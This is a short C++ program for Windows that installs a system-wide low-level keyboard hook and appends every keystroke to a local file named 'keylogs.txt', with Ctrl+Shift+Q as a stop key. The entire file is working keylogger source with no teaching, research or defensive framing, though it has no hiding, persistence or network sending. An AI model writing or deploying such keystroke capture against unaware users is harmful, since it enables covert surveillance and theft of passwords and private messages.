#include <windows.h>
#include <fstream>
#include <iostream>

using namespace std;

HHOOK hHook = NULL;
ofstream outputFile;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = pKeyBoard->vkCode;

            // Check for Ctrl + Shift + Q to stop the hook
            if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && 
                (GetAsyncKeyState(VK_SHIFT) & 0x8000) && 
                vkCode == 'Q') {
                PostQuitMessage(0);
            }

            outputFile << char(vkCode);
            outputFile.flush();
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void SetHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        cerr << "Failed to install hook!" << endl;
    }
}

void ReleaseHook() {
    UnhookWindowsHookEx(hHook);
    outputFile.close();
}

int main() {
    outputFile.open("keylogs.txt", ios::out | ios::app);
    if (!outputFile.is_open()) {
        cerr << "Failed to open log file!" << endl;
        return 1;
    }

    SetHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ReleaseHook();
    return 0;
}
